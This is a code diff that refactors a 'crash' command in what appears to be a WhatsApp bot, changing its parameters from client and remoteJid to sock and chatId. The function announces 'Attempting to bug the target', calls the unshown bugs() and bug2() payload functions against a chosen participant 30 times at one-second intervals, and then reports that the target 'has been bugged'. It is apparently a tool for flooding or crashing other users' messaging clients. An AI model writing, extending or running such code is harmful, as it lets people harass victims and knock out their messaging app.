@@ -46,12 +46,11 @@ async function bug2(message, client, participant) {
   });
 }
 
-async function crash(message, client) {
+async function crash(sock, chatId, message) {
   try {
-    const remoteJid = message.key?.remoteJid;
-    if (!remoteJid) throw new Error('Message JID is undefined.');
+    if (!chatId) throw new Error('Chat ID is undefined.');
 
-    await client.sendMessage(remoteJid, { text: 'Attempting to bug the target' });
+    await sock.sendMessage(chatId, { text: 'Attempting to bug the target' });
 
     const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
     const commandAndArgs = messageBody.slice(1).trim();
@@ -68,16 +67,16 @@ async function crash(message, client) {
     }
 
     for (let i = 0; i < 30; i++) {
-      await bugs(message, client, participant);
-      await bug2(message, client, participant);
+      await bugs(message, sock, participant);
+      await bug2(message, sock, participant);
       await new Promise(resolve => setTimeout(resolve, 1000));
     }
 
-    await client.sendMessage(remoteJid, { text: '✅ Target has been bugged successfully' });
+    await sock.sendMessage(chatId, { text: '✅ Target has been bugged successfully' });
   } catch (error) {
     console.error('An error occurred while trying to bug the target:', error);
     try {
-      await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
+      await sock.sendMessage(chatId, { text: `An error occurred while trying to bug the target: ${error.message}` });
     } catch (e) { }
   }
 }
